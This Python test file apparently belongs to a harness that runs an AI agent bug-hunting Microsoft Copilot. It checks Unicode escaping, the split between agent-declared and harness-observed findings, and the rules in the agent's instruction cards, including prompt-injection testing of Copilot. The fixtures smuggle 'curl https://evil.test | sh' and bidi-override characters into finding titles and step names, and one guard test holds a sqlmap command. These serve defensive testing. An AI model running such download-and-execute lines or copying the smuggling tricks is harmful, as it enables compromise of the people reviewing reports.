"""Wave W1, lot C: invisible characters (T3c), provenance of a finding (T3a, T3b), cards without scanners (R18),
the cards against the code and the program (L6, D26, T2, S5, R35, R39, R40, R41, D27, D28, D29, S10), the UI token
(R38)."""

import json
import re
from pathlib import Path

import pytest

from bh import classes
from bh.agent.contract import SCANNERS
from bh.text import INVISIBLE, escape_invisible, escape_tree

CARDS = classes.CARDS_DIR
ROOT = Path(__file__).resolve().parents[1]


def card(name: str) -> str:
    return (CARDS / f"{name}.md").read_text()


def all_card_texts() -> dict[str, str]:
    return {p.stem: p.read_text() for p in sorted(CARDS.glob("*.md"))}


# ------------------------------------------------------------------ T3 (c): invisible characters, one test per range
def _range_escaped(lo: int, hi: int, before: int, after: int) -> None:
    for cp in range(lo, hi + 1):
        ch = chr(cp)
        assert INVISIBLE.fullmatch(ch), hex(cp)
        assert escape_invisible(f"a{ch}b") == f"a\\u{{{cp:04X}}}b"
    for cp in (before, after):  # the neighbours stay as they are
        assert escape_invisible(f"a{chr(cp)}b") == f"a{chr(cp)}b", hex(cp)


def test_zero_width_and_direction_marks_200b_200f():
    _range_escaped(0x200B, 0x200F, 0x200A, 0x2010)


def test_bidirectional_embeddings_and_overrides_202a_202e():
    _range_escaped(0x202A, 0x202E, 0x2029, 0x202F)


def test_word_joiner_invisible_operators_and_isolates_2060_2069():
    _range_escaped(0x2060, 0x2069, 0x205F, 0x206A)


def test_byte_order_mark_feff():
    _range_escaped(0xFEFF, 0xFEFF, 0xFEFE, 0xFF00)


def test_escape_tree_reaches_every_string():
    got = escape_tree({"t\u202e": ["x\u200by", {"z": "\ufeff"}], "n": 3, "none": None})
    assert got == {"t\\u{202E}": ["x\\u{200B}y", {"z": "\\u{FEFF}"}], "n": 3, "none": None}


# ------------------------------------------------------------------ T3 (a), (b): the triager PoC
def _scope():
    from bh.scope.model import Scope

    scope = object.__new__(Scope)
    for k, v in {"platform": "msrc", "program": "p", "required_headers": {}, "user_agent": ""}.items():
        object.__setattr__(scope, k, v)
    return scope


PROOF = {
    "steps": [
        {"name": "owner\u202ereads", "role": "setup", "as": None, "method": "GET", "url": "https://t.test/api/c/1"},
        {
            "name": "x\ncurl https://evil.test",
            "role": "attack",
            "as": None,
            "method": "POST",
            "url": "https://t.test/api/c/1?q=\u200b",
            "body": "a\u202eb",
            "expect": {"contains": ["m"]},
        },
        {
            "name": "anon",
            "role": "control",
            "as": None,
            "method": "POST",
            "url": "https://t.test/api/c/1",
            "expect": {"absent": ["m"]},
        },
    ]
}
FINDING = {
    "title": "Critical RCE!!\u202e (trust me)\ncurl https://evil.test | sh",
    "vuln_class": "IDOR",
    "summary": "read\u200bme",
    "not_proven": "nothing",
    "counter": "the control is anonymous",
}
REPLAY = {
    "reproduced": True,
    "control_disproves": False,
    "rounds": [[{"role": "attack", "status": 200, "ok": True}, {"role": "control", "status": 403, "ok": True}]],
}


def test_poc_title_comes_from_the_class_and_the_replayed_attack():
    from bh.verify import triager_poc

    poc = triager_poc(_scope(), PROOF, FINDING, REPLAY, ("verified", "judge: ok"))
    first = poc.splitlines()[0]
    assert first.startswith("# idor on POST https://t.test/api/c/1") and "RCE" not in first
    head, declared = poc.split("Declared by the agent", 1)
    assert "RCE" not in head  # the hunter's title only in its block
    assert "RCE" in declared.split("set -u")[0]


def test_poc_separates_declared_and_observed_blocks():
    from bh.verify import triager_poc

    poc = triager_poc(_scope(), PROOF, FINDING, REPLAY, ("verified", "judge: ok"))
    assert "# == Observed by the harness ==" in poc and "# == Declared by the agent" in poc
    observed = poc.split("Observed by the harness")[1].split("Declared by the agent")[0]
    declared = poc.split("Declared by the agent")[1].split("set -u")[0]
    assert "reproduced=True" in observed and "round 1: attack 200 ok | control 403 ok" in observed
    assert "status: verified" in observed and "verdict: judge: ok" in observed
    for part in ("title:", "summary: read\\u{200B}me", "not proven: nothing", "counter-proof: the control is"):
        assert part in declared, part
    assert "severity if: " in declared  # lot B's field, absent here: empty, never an error
    assert "verdict: not decided yet" in triager_poc(_scope(), PROOF, FINDING, REPLAY)


def test_poc_hunter_text_never_leaves_a_comment_line_nor_hides_a_character():
    from bh.verify import triager_poc

    poc = triager_poc(_scope(), PROOF, FINDING, REPLAY)
    assert not INVISIBLE.search(poc)
    for line in poc.splitlines():  # every line is a comment, a blank, `set -u` or one of our curl commands
        assert not line or line.startswith(("#", "set -u", "curl ")), line
    assert "\\u{202E}" in poc and "$'a\\u202Eb'" in poc  # the request stays replayable, the character visible
    assert triager_poc(_scope(), {"steps": ["nope", {"url": 5}]})  # still robust to a malformed proof


# ------------------------------------------------------------------ T3 (b), (c), R38: the UI
def _serve(tmp_path, monkeypatch):
    import threading
    from http.server import ThreadingHTTPServer

    from bh.ui.server import COOKIE, Handler, new_session

    monkeypatch.setenv("BH_HOME", str(tmp_path))
    srv = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
    srv.token = "tok-123"
    srv.daemon_threads = True
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    return srv, f"{COOKIE}={new_session('tok-123')}"


def _req(srv, path, *, cookie=None, data=None):
    import urllib.error
    import urllib.request

    class NoRedirect(urllib.request.HTTPRedirectHandler):
        def redirect_request(self, *a, **k):
            return None

    req = urllib.request.Request(f"http://127.0.0.1:{srv.server_address[1]}{path}", data=data)
    if cookie:
        req.add_header("Cookie", cookie)
    try:
        with urllib.request.build_opener(NoRedirect).open(req, timeout=5) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read()


def test_ui_finding_has_provenance_blocks_and_no_invisible_character(tmp_path, monkeypatch):
    from bh.board import Board

    srv, cookie = _serve(tmp_path, monkeypatch)
    try:
        b = Board()
        fid = b.add_finding("p", FINDING["title"], severity="high", summary="s\u2066x", not_proven="np")
        b.finding_set(fid, replay=json.dumps(REPLAY))
        code, body = _req(srv, f"/api/findings/{fid}", cookie=cookie)
        assert code == 200
        text = body.decode()
        assert not INVISIBLE.search(text) and "\\\\u{202E}" in text  # escaped on the server, before sending
        f = json.loads(text)
        assert f["provenance"]["declared"]["summary"] == "s\\u{2066}x"
        assert f["provenance"]["declared"]["counter"] == "" and f["provenance"]["declared"]["severity_if"] == ""
        assert f["provenance"]["observed"]["replay"]["reproduced"] is True
        assert f["provenance"]["observed"]["status"] == "new"
    finally:
        srv.shutdown()
        srv.server_close()
    js = (ROOT / "src/bh/ui/static/app.js").read_text()
    assert '"Declared by the agent"' in js and '"Observed by the harness"' in js
    assert "${f.title}" not in js  # the drawer header no longer shows the hunter's title


@pytest.mark.parametrize(
    "token,code", [(" tok-123", 303), ("tok-123\n", 303), ("\ttok-123 \r\n", 303), ("tok-1x23", 403), ("tok- 123", 403)]
)
def test_ui_login_strips_the_pasted_token(tmp_path, monkeypatch, token, code):
    from urllib.parse import urlencode

    srv, _ = _serve(tmp_path, monkeypatch)
    try:
        assert _req(srv, "/login", data=urlencode({"token": token}).encode())[0] == code
    finally:
        srv.shutdown()
        srv.server_close()


# ------------------------------------------------------------------ R18 (N18, I8): cards without a scanner
_SCANNER = re.compile(
    r"(?<![\w.-])(" + "|".join(re.escape(n) for n in sorted(SCANNERS, key=len, reverse=True)) + r")(?![\w.-])", re.I
)


def test_card_files_name_no_scanner():
    """The agent may `Read` any card on any program: the files themselves name no scanner nor scanner mode."""
    for name, text in all_card_texts().items():
        assert not _SCANNER.search(text), (name, _SCANNER.search(text).group())
        assert "--write-own" not in text and "--active" not in text, name


@pytest.mark.parametrize("name", classes.all_cards())
def test_every_card_in_both_settings(name):
    off = classes.cards_block([name], scanners=False)
    assert not _SCANNER.search(off) and "--write-own" not in off, name
    assert classes.card_text(name) in off  # nothing of the card itself was lost
    pinned = classes.cards_block([], [name], scanners=False)
    assert not _SCANNER.search(pinned), name
    on = classes.cards_block([name], scanners=True)
    assert classes.card_text(name) in on
    cls = classes.BY_ID.get(name)
    if cls is not None and cls.scan:
        assert cls.scan in on and cls.scan not in off


def test_scanner_settings_reach_the_tool_line_and_default_to_none():
    off, on = classes.cards_block(["idor"], scanners=False), classes.cards_block(["idor"], scanners=True)
    tool_off = next(line for line in off.splitlines() if line.startswith("Tool:"))
    assert "bh-authz" in tool_off and "--write-own" not in tool_off
    assert "--write-own" in on
    assert "bh-sqli" in classes.cards_block(["sqli"], scanners=True)
    assert classes.cards_block(["sqli", "xss", "info-disclosure"]) == classes.cards_block(
        ["sqli", "xss", "info-disclosure"], scanners=False
    )  # a caller that does not say gets the scanner-free cards
    for touched in ("xss", "sqli", "broken-access-control", "info-disclosure"):
        assert not _SCANNER.search(card(touched)) and "--write-own" not in card(touched)


def test_no_scanner_guard_drops_a_line_that_names_one():
    assert classes.no_scanner("a\nrun sqlmap -u x\nb\nbh-authz --write-own\nc") == "a\nb\nc"


# ------------------------------------------------------------------ L6, D26: no count of ids in the cards
def test_no_card_cites_a_number_of_ids():
    for name, text in all_card_texts().items():
        assert "more than 4" not in text, name
        assert not re.search(r"\b\d+\s+distinct ids", text), name
    assert "far below the gate's limit" in card("ai-conversation-isolation")


def test_program_card_conversation_pace_is_below_the_gate_id_limit():
    from bh.gate import policy

    m = re.search(r"At most (\d+) new conversations per 10 min", card("msrc-copilot"))
    assert m, "the pace line is gone"
    assert int(m.group(1)) < policy.ID_LIMIT


# ------------------------------------------------------------------ T2: a canary proves nothing outside a private place
def test_canary_standard_needs_a_private_place():
    for cid in ("prompt-injection", "idor", "broken-access-control"):
        ev = classes.evidence(cid)
        assert "private to the victim by construction" in ev and "proves nothing" in ev, cid


# ------------------------------------------------------------------ S5: SSRF as MSRC wants it
def test_ssrf_never_aims_at_an_internal_address():
    ssrf, ev, conn = card("ssrf"), classes.evidence("ssrf"), card("ai-connectors")
    for text in (ssrf, ev, conn):
        assert "127.0.0.1" not in text and "169.254" not in text
    assert "metadata" not in ev.lower() and "metadata" not in conn.lower()
    for line in ssrf.splitlines():  # "metadata" only as something never to aim at
        if "metadata" in line.lower():
            assert line.startswith("Never:"), line
    assert "loopback, link-local, cloud metadata or internal" in ssrf
    assert "lead for the human" not in ssrf
    for text in (ssrf, ev):  # the same proof on both sides
        assert "request received on a host of ours" in text and 'bh-note blocked oob-needed "' in text
        assert "in-scope page" in text


# ------------------------------------------------------------------ R39: the spectator mode in the two cards
def test_cards_follow_the_spectator_mode():
    for name in ("bh-web-manual", "msrc-copilot"):
        t = " ".join(card(name).split())  # one line: the cards wrap
        assert "again each turn" not in t and "each turn until it is false" not in t, name
        assert "each page load costs" not in t, name
        assert "human_watching" in t and "human-viewing" in t and "wait-human" in t, name
        assert "never `goto` a page a click can reach" in t.lower(), name
        assert not re.search(r"\b(exit|code|exits)\s*5\b", t, re.I), name
    manual = card("bh-web-manual")
    assert "challenge is cleared and the page rendered" in manual
    assert re.search(r"human-viewing`: the operator took the screen back\. One `bh-web wait-human`", manual)
    assert "`bh-web wait-human` again later" in manual
    assert "first message of a new\n   app session costs the operator one challenge" in card("msrc-copilot")


# ------------------------------------------------------------------ R35: the service's own cap
def test_service_daily_limit_in_the_manual():
    m = card("bh-web-manual")
    for part in (
        "`service daily limit`",
        "`quota`",
        "`until`",
        "`remaining_pct`",
        "costs one `bh-web switch`",
        "look for no way\n    around the cap",
    ):
        assert part in m, part
    for name, text in all_card_texts().items():
        for line in text.splitlines():
            if re.search(r"limit|quota|\bcap\b|per day|a day", line, re.I):
                assert "UTC" not in line, (name, line)


# ------------------------------------------------------------------ R40, R41: two new reads
def test_manual_names_net_body_and_clipboard_and_keeps_15_subcommands():
    m = card("bh-web-manual")
    step1 = m.split("1. Commands.")[1].split("\n2. ")[0]
    subs = set(re.findall(r"^\s+`bh-web ([a-z-]+)", step1, re.M))
    assert subs == {
        "state",
        "goto",
        "fill",
        "click",
        "press",
        "wait",
        "text",
        "outline",
        "attr",
        "net",
        "frames",
        "tabs",
        "upload",
        "switch",
        "wait-human",
    }
    assert "`--body <i>`" in step1 and "at most 4000" in step1 and "not a target" in step1
    assert "`--clipboard`" in step1 and "at most 2000 characters (refused during a challenge" in step1
    step6 = m.split("\n6. ")[1].split("\n7. ")[0]
    assert "`bh-web net --body <i>`" in step6 and "`bh-web text --clipboard`" in step6 and "number `i`" in step6


# ------------------------------------------------------------------ D27: payload hosts
def test_cards_use_the_payload_host_token():
    for name, text in all_card_texts().items():
        assert "example.org" not in text and "example.com" not in text, name
        if "<payload-host>" in text:
            flat = " ".join(text.split())
            said = (
                'the payload hosts of your scope block; none listed: `bh-note blocked other "no payload host declared"`'
            )
            assert flat.count(said) == 1, name
    for name in ("ai-output-rendering", "open-redirect", "cors", "prompt-injection"):
        assert "<payload-host>" in card(name), name


# ------------------------------------------------------------------ D28: roles
def test_roles_are_not_frozen():
    texts = all_card_texts()
    for name, text in texts.items():
        assert "--victim user-b --attacker user-a" not in text, name
        assert "--victim <B> --attacker <A>" not in text, name
    for name in (
        "msrc-copilot",
        "prompt-injection",
        "ai-connectors",
        "ai-memory",
        "ai-file-upload",
        "ai-conversation-isolation",
    ):
        assert "--victim <identity> --attacker <the other>" in texts[name], name
    prog = texts["msrc-copilot"]
    assert "each play either role" in prog and "every intent names its own" in prog
    assert "A role change in the browser costs one `bh-web switch` (at most 2 per segment)" in prog
    for name in ("ai-memory", "ai-connectors"):
        assert "as user-b" not in texts[name].lower() and "victim identity" in texts[name], name


# ------------------------------------------------------------------ D29: the program card and its surfaces
def _table_rows(text: str) -> list[list[str]]:
    return [
        [c.strip() for c in line.strip().strip("|").split("|")]
        for line in text.splitlines()
        if re.match(r"\s*\| \d+ \|", line)
    ]


def test_program_card_memory_severity_and_report():
    prog = card("msrc-copilot")
    assert "Memory (enabled on both accounts)" in prog
    assert "MSRC Important = `--severity high`, Critical = `critical`" in prog
    assert "the report says the test ran on copilot.com" in prog
    mem = card("ai-memory")
    assert "user-b" not in mem  # never user-b alone: the victim identity


def test_connectors_are_google_and_notion():
    prog, conn = card("msrc-copilot"), card("ai-connectors")
    for t in (prog, conn):
        assert "Google" in t and "Notion" in t and ("PayPal excluded" in t or "PayPal is excluded" in t)
    assert "mailbox" not in conn and "a mail from" not in conn
    assert "placed in the linked account by the operator" in conn
    assert 'bh-note blocked account "connector not enabled"' in conn
    never = conn.split("Never:")[1].split("\nDo:")[0]
    assert "request a Google or Notion host" in never
    for name, text in all_card_texts().items():
        assert "outlook" not in text.lower(), name


def test_prompt_budget_and_fills():
    prog = card("msrc-copilot")
    assert "200 per identity" not in prog and "spends 68" not in prog and "UTC day" not in prog
    assert "about 45 prompts a day per account" in prog and "`fills.segment_left`" in prog and "often 0" in prog
    assert "Start a surface only when its `Fills` fit" in prog
    rows = _table_rows(prog)
    assert len(rows) >= 9
    for row in rows:
        assert int(row[3]) <= 10, row
    pi = card("prompt-injection")
    assert len(pi.strip().splitlines()) <= 40 and "Run 1 =" in pi and "Run 2 =" in pi and "later run" in pi


def test_out_of_scope_hosts_are_never_reachable_in_a_card():
    prog = card("msrc-copilot")
    for host in ("copilot.cloud.microsoft", "graph.microsoft.com", "Notebooks (Loop)"):
        assert host in prog, host
    assert 'bh-note blocked other "' in card("copilot-share") and 'bh-note blocked other "' in card("ai-file-upload")
    for name, text in all_card_texts().items():
        lines = text.splitlines()
        for i, line in enumerate(lines):
            if re.search(r"copilot\.cloud\.microsoft|graph\.microsoft\.com|/recommended/api", line):
                window = " ".join(lines[max(0, i - 1) : i + 2])
                assert "not in the scope" in window.lower() or "blocked other" in window, (name, line)
    share = card("copilot-share")
    steps = share.split("\n4. ")[1].split("\n10. ")[0]
    assert "q " not in steps and "qq " not in steps and "bh-browse" not in steps  # steps 4 to 9: no request


def test_copilot_share_card():
    share = card("copilot-share")
    assert "`POST …/m365Copilot/conversations/<id>/sharelinks`" in share and "browser's bearer" in share
    assert "`bh-web net --body <i>`" in share and "`bh-web text --clipboard`" in share
    watch = share.split("Watch:")[1].split("Proof:")[0]
    assert '"Anyone with a link can access a copy of this chat"' in watch
    assert '"Content\nreferenced in this chat can only be viewed with permission"' in watch
    assert "Redeem" in share and "`shareId`" in share and "`conversationId`" in share and "SECOND conversation" in share
    assert len(share.strip().splitlines()) <= 40


def test_bearer_and_closed_leads_lines():
    prog = card("msrc-copilot")
    assert "one-hour bearer the gate renews for the browser's identity" in prog
    assert "`identity bearer expired`" in prog and "not the target's answer" in prog
    assert "`bh-web switch` renews the other's" in prog
    closed = prog.split("Closed by the operator, 2026-11-26")[1][:400]
    for lead in ("RefreshNavPane", "ConversationResponseComplete", "CORS", "GetUserFacts", "/login?returnUrl="):
        assert lead in closed, lead


# ------------------------------------------------------------------ S10: the server actions card
WAITLIST = {"bh-js"}  # lot G ships it; the orchestrator empties this list at the merge


def _agent_commands() -> set[str]:
    """The commands src/bh/agent/main.py dispatches: TOOLS and every `cmd == / cmd in` branch (q, qq: bare)."""
    main = (ROOT / "src/bh/agent/main.py").read_text()
    lines = [x for x in main.splitlines() if re.search(r"^TOOLS = |\bcmd (==|in) ", x)]
    words = set(re.findall(r'"([a-z-]+)"', "\n".join(lines)))
    return {w if w in ("q", "qq") else f"bh-{w}" for w in words}


def test_server_actions_card():
    text = card("copilot-server-actions")
    lines = text.strip().splitlines()
    assert len(lines) <= 40 and lines[0].startswith("## ")
    for part in ("When:", "Never:", "Do:", "Watch:", "Proof:", "Next:"):
        assert re.search(rf"^{part}", text, re.M), part
    for part in (
        "`POST https://copilot.com/resources/app-shell-action`",
        "`POST https://copilot.com/chat`",
        '`{"action": "<Name>", ...}`',
        "`x-route-id`",
        "`Accept: application/json`",
        "cookies only",
        "`bh-web net --last 200`",
        "-k recon",
        "`ic3proxy`",
        "UpdateChatPinStatus",
        "text/plain",
        "`returnUrl` from a\nfresh session",
        "--class broken-access-control",
        "twin control",
    ):
        assert part in text, part
    closed = text.split("Watch:")[1].split("Open:")[0]
    for lead in ("RefreshNavPane", "ConversationResponseComplete", "CORS", "GetUserFacts", "/login?returnUrl="):
        assert lead in closed, lead
    row = next(r for r in _table_rows(card("msrc-copilot")) if r[2] == "copilot-server-actions")
    assert row[3] == "0" and row[4] == "--proof"


def test_server_actions_card_commands_exist():
    known = _agent_commands()
    assert {"bh-web", "bh-note", "bh-crawl", "q", "qq"} <= known
    cited = set(re.findall(r"`(bh-[a-z-]+|qq?)\b", card("copilot-server-actions")))
    assert cited - known <= WAITLIST, cited - known
    note = (ROOT / "src/bh/agent/note.py").read_text()
    for sub in re.findall(r"`bh-note ([a-z]+)", card("copilot-server-actions")):
        assert f'add_parser("{sub}"' in note, sub


def test_server_actions_card_names_no_host_outside_the_copilot_scope():
    from urllib.parse import urlsplit

    from bh.scope import load_scope

    scope = load_scope(ROOT / "scopes/msrc/copilot.yaml")
    hosts = {(urlsplit(r.value).hostname if "://" in r.value else r.value).lower() for r in scope.in_scope}
    named = set(re.findall(r"\b((?:[a-z0-9-]+\.)+(?:com|net|org|microsoft|ai|io))\b", card("copilot-server-actions")))
    assert named and named <= hosts, named - hosts
